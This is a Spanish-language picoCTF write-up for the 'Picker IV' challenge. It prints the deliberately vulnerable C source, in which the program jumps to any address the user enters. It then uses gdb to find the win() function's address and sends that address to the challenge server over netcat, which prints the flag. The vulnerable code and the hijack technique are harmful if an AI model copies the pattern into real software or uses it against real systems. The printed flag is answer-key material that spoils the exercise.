# Picker IV
#picoCTF 
## Descripción
Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 60720` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV.c). The binary can be downloaded [here](https://artifacts.picoctf.net/c/528/picker-IV).

## Pistas 

## Solución
```bash 
┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ wget https://artifacts.picoctf.net/c/528/picker-IV.c
--2023-05-24 20:58:13--  https://artifacts.picoctf.net/c/528/picker-IV.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.56, 13.249.74.22, 13.249.74.17, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.56|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839 [application/octet-stream]
Saving to: ‘picker-IV.c’

picker-IV.c                  100%[==============================================>]     839  --.-KB/s    in 0s      

2023-05-24 20:58:14 (28.8 MB/s) - ‘picker-IV.c’ saved [839/839]

                                                                                                                    
┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ wget https://artifacts.picoctf.net/c/528/picker-IV  
--2023-05-24 20:58:20--  https://artifacts.picoctf.net/c/528/picker-IV
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.69, 13.249.74.56, 13.249.74.22, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 17272 (17K) [application/octet-stream]
Saving to: ‘picker-IV’

picker-IV                    100%[==============================================>]  16.87K  --.-KB/s    in 0.005s  

2023-05-24 20:58:20 (3.49 MB/s) - ‘picker-IV’ saved [17272/17272]

                                                                                                                    
┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ ls
picker-IV  picker-IV.c

┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ cat picker-IV.c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}


┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ gdb picker-IV      


(gdb) break win
Breakpoint 1 at 0x4012a6
(gdb) run
Starting program: /home/kali/hacking/examen3/picker-IV 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the address in hex to jump to, excluding '0x': 0xdddddddd
You input 0xdddddddd

Program received signal SIGSEGV, Segmentation fault.
0x00000000dddddddd in ?? ()
(gdb) info address win
Symbol "win" is at 0x40129e in a file compiled without debugging.
(gdb) set $rip=0x40129e
(gdb) continue
Continuing.
Segfault triggered! Exiting.
[Inferior 1 (process 84481) exited with code 013]
(gdb) 

┌──(kali㉿kali)-[~/TercerParcial/Binary/PickerIV]
└─$ nc saturn.picoctf.net 60720
Enter the address in hex to jump to, excluding '0x': 0x40129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```
## Bandera
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}

## Notas adicionales
| comando | descripción |
|------------|---------------|
| xx | xx |

## Referencias
